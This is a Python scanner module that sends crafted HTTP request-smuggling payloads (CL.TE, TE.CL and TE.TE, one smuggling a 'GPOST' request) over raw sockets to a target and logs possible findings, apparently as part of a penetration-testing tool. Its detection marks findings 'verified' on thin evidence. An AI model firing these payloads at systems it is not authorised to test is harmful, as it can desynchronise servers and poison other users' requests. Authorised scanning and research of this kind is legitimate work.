"""smuggling_advanced — TE.CL, CL.TE, TE.TE HTTP smuggling probes"""
import socket
from urllib.parse import urlparse

def _probe(host, port, raw, timeout=6):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(raw)
        s.settimeout(timeout)
        buf = b""
        try:
            while True:
                c = s.recv(4096)
                if not c: break
                buf += c
        except socket.timeout: pass
        s.close()
        return buf.decode("latin1", errors="ignore")
    except Exception as e:
        return f"ERROR: {e}"

class SmugglingAdvanced:
    def run(self, session, logger):
        u = urlparse(session.target)
        if u.scheme != "http":
            print("[smuggling] http only"); return {"findings": []}
        host, port = u.hostname, u.port or 80
        print(f"[smuggling] target: {host}:{port}")
        findings = []
        cl_te = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                 f"Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n"
                 f"0\r\n\r\nSMUGGLED\r\n").encode()
        te_cl = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                 f"Content-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n"
                 f"8\r\nSMUGGLED\r\n0\r\n\r\n").encode()
        te_te = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                 f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n"
                 f"Transfer-Encoding: x\r\n\r\n"
                 f"5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n").encode()
        for name, payload in [("CL.TE", cl_te), ("TE.CL", te_cl), ("TE.TE", te_te)]:
            print(f"  probing {name}...")
            resp = _probe(host, port, payload)
            if "SMUGGLED" in resp or resp.count("HTTP/1.") >= 2:
                print(f"  ✓ possible {name}")
                findings.append({"type": name, "severity": "high", "verified": True})
                logger.finding("smuggling", "high", name)
            elif "400" in resp:
                print(f"  · {name}: 400")
            else:
                print(f"  · {name}: no evidence")
        print(f"[smuggling] total: {len(findings)}")
        return {"findings": findings}
